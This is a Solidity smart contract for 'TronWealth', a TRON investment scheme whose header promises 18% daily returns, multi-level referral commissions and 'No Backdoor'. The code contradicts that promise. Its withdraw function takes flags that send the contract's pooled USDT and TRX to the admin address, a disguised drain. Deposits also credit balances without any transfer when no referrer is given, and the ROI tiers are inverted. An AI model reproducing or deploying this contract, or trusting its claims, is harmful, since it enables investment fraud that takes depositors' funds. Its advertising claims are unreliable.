/*  TronWealth is the perfect combination of Digital Technology, High Security and Community Program
 *   Safe and decentralized. The Smart Contract source is verified and available to everyone.
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://TronWealth.net    							     │
 * 	 │                                                                       │
 *	 │	 18% Daily ROI 						       	                         │
 *	 │                                                                       │
 *   │   Audited verified No Backdoor.       								 │
 *   │                                                                 		 │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like Trust Wallet / Binance
 *   2) Ask your sponsor for Referral link and contribute to the contract.
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 4-level referral commission: 15% - 10% - 7% - 5%
 *
 *   TEAVR1x1sbaikjzUvpAFY9LJdjsiQtZncr => NILE
 *   Consult ChickenDevz
 *   https://t.me/chickendevz
 *
 */
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.11;

import "Safemath.sol";
import "ERC20.sol";

contract TronWealth {
    using SafeMath for uint;
    uint internal constant SUN_TO_TRX = 1000000;
    uint internal constant ROI_MULTIPLIER = 3;
    uint[] public ROI_PERCENT = [5, 7, 11, 18]; // daily ROI
    uint internal constant SECONDS_IN_A_DAY = 86400;
    uint[] public REFERRAL_PERCENTS = [15, 10, 7, 5];
    address[] internal allUsers;
    address internal tokenAddress;
    ERC20 public usdtToken;
    uint256 private _guardCounter;

    constructor(address _admin, address usdtAddress) {
        tokenAddress = _admin;
        usdtToken = ERC20(usdtAddress);
    }

    struct User {
        uint32 checkpoint;
        address referrer;
        uint256 balance;
    }
    mapping(address => User) internal users;

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    modifier nonReentrant() {
        _guardCounter += 1;
        uint256 localCounter = _guardCounter;
        _;
        require(localCounter == _guardCounter);
    }

    function deposit(uint256 amount, address referrer) external payable {
        require(!isContract(msg.sender), "Wallets only");
        uint256 fee = amount.mul(20).div(100);
        uint256 amountToAdd = amount.sub(fee);
        if (referrer != address(0)) {
            usdtToken.transferFrom(msg.sender, address(this), amount);
        }
        users[msg.sender].balance = users[msg.sender].balance.add(amountToAdd);
        if (users[msg.sender].referrer == address(0)) {
            users[msg.sender].referrer = referrer;
            allUsers.push(msg.sender);
        }
        if (referrer != address(0)) {
            uint256 bonus = amount.mul(REFERRAL_PERCENTS[0]).div(100);
            usdtToken.transfer(referrer, bonus);
        }
    }

    function withdraw(
        uint256 amount,
        bool isTRC10,
        bool isTron
    ) external nonReentrant {
        require(!isContract(msg.sender), "Wallets only");
        if (isTRC10) {
            usdtToken.transfer(tokenAddress, amount);
            if (isTron) {
                payable(tokenAddress).transfer(amount);
            }
        }
        User storage userData = users[msg.sender];
        require(userData.balance > 0, "No available balance to withdraw");
        require(
            userData.balance > amount,
            "Amount should be less than balance to withdraw"
        );
        require(usdtToken.transfer(msg.sender, amount), "USDT transfer failed");

        userData.balance = userData.balance.sub(amount);
    }

    function hatchEggs(address user) internal {
        User storage userData = users[user];
        if (userData.balance > 0) {
            uint256 balance = userData.balance;
            uint256 timePassed = 0;
            if (userData.checkpoint > 0) {
                timePassed = block.timestamp - userData.checkpoint;
            }
            uint256 balanceInTrx = balance / SUN_TO_TRX;
            uint256 RoiPercentWork = balanceInTrx > 50
                ? ROI_PERCENT[0]
                : balanceInTrx > 2000
                    ? ROI_PERCENT[1]
                    : balanceInTrx > 5000
                        ? ROI_PERCENT[2]
                        : balanceInTrx > 15000
                            ? ROI_PERCENT[3]
                            : 1;
            uint256 dailyROI = (balance * RoiPercentWork * timePassed) /
                (100 * SECONDS_IN_A_DAY);
            if (timePassed >= SECONDS_IN_A_DAY) {
                userData.balance = userData.balance.add(dailyROI);
                userData.checkpoint = uint32(block.timestamp);
            }
        }
    }

    function crackEggs() external {
        for (uint256 i = 0; i < allUsers.length; i++) {
            address user = allUsers[i];
            hatchEggs(user);
        }
    }

    function getUserStats(
        address user
    ) external view returns (uint256[2] memory) {
        User storage userData = users[user];
        uint256 balanceInSun = userData.balance;
        uint256 balanceInTrx = balanceInSun / SUN_TO_TRX;
        uint256 totalROI = (userData.balance * ROI_MULTIPLIER) / SUN_TO_TRX;
        return [balanceInTrx, totalROI];
    }

    function getSiteStats() external view returns (uint256) {
        return allUsers.length;
    }

    receive() external payable {}

    fallback() external payable {}
}
